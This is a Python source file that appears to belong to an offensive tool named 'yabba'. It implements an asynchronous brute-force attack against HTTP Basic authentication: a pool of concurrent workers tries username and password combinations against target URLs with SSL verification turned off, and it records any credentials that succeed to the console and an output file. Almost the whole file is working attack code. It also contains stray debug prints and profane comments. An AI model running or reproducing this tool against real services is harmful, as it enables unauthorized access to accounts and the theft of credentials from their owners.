from asyncio_pool import AioPool
from asyncio_pool.results import getres
from functools import partial
from yabba.utils import C, target_tasks
import aiohttp
import asyncio
import ssl
import sys


async def worker(args):
    url, username, password = args
    try:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(verify_ssl=False),
            auth=aiohttp.BasicAuth(username, password),
        ) as session:
            async with session.get(url, ssl=False) as resp:
                await resp.text()
                print("FART 2")
                if resp.status // 100 == 2:
                    return True, args
                return False, args

    except (ConnectionRefusedError, aiohttp.ClientError):
        return False, args

    # except Exception as e:
    #     print("SOME FUCKING ERROR")
    #     import traceback
    #     traceback.print_exc()
    #     print(e)
    return None, args


async def brute_basic(http_target_factory,
                      combo_factory=None,
                      username_factory=None,
                      password_factory=None,
                      pool_size: int = 100,
                      timeout: float = 5.0,
                      output: str = None,
                      loop: asyncio.AbstractEventLoop = None,
                      verbose: bool = False):
    loop = loop or asyncio.get_event_loop()
    tasks = target_tasks(
        http_target_factory,
        combo_factory,
        username_factory,
        password_factory,
    )

    def def_handler(_loop, ctx):
        loop.default_exception_handler(ctx)

    old_handler = loop.get_exception_handler() or def_handler

    def new_handler(_loop, ctx):
        exc = ctx.get("exception")
        ignore = (
            ssl.SSLError,
            asyncio.CancelledError,
        )
        if isinstance(exc, ignore):
            return
        old_handler(_loop, ctx)

    loop.set_exception_handler(new_handler)

    try:
        async with AioPool(pool_size) as pool:
            suc_files = [sys.stdout]
            err_files = [sys.stderr]

            if output:
                f = open(output, "a+")
                suc_files.append(f)

            kwargs = dict(timeout=timeout*1.5, get_result=getres.pair)

            async for (val, err) in pool.itermap(worker, tasks, **kwargs):
                if err:
                    print("ERROR")
                    print(err)
                    continue
                result, (url, username, password) = val
                if result is True:
                    print(C.GRN, file=sys.stdout, end="")
                    for file in suc_files:
                        print("{} {}:{}".format(url, username, password),
                              file=file, flush=True)
                    print(C.RST, file=sys.stdout, end="", flush=True)
                elif verbose:
                    print(C.RED, file=sys.stderr, end="")
                    for file in err_files:
                        print("Failure {} {}:{}".format(url, username, password),
                              file=file, flush=True)
                    print(C.RST, file=sys.stderr, end="", flush=True)
    finally:
        loop.set_exception_handler(old_handler)

